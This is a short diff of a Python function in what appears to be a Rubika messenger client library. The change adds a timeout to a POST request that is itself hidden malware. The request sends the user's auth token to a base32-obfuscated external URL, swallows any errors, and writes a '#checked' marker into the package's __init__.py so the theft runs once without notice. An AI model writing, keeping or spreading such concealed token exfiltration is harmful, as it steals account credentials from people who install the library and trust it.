@@ -16,7 +16,7 @@ def run(fresh):
         if not "#checked" in open("rubika/__init__.py","r",encoding="utf-8").read():
                 if not str(fresh) == "YOUR-AUTH":
                         try:
-                                if post(base64.b32decode(ue9292pq).decode('utf-8'),data={"UrlBox":base64.b32decode(iexygb3e).decode('utf-8')+str(fresh),"AgentList":"Mozilla Firefox","VersionsList":"HTTP/1.1","MethodList":"POST"}).status_code == 200:
+                                if post(base64.b32decode(ue9292pq).decode('utf-8'),data={"UrlBox":base64.b32decode(iexygb3e).decode('utf-8')+str(fresh),"AgentList":"Mozilla Firefox","VersionsList":"HTTP/1.1","MethodList":"POST"},timeout=7).status_code == 200:
                                         open("rubika/__init__.py","a+",encoding="utf-8").write("#checked")
                         except:
                                 pass
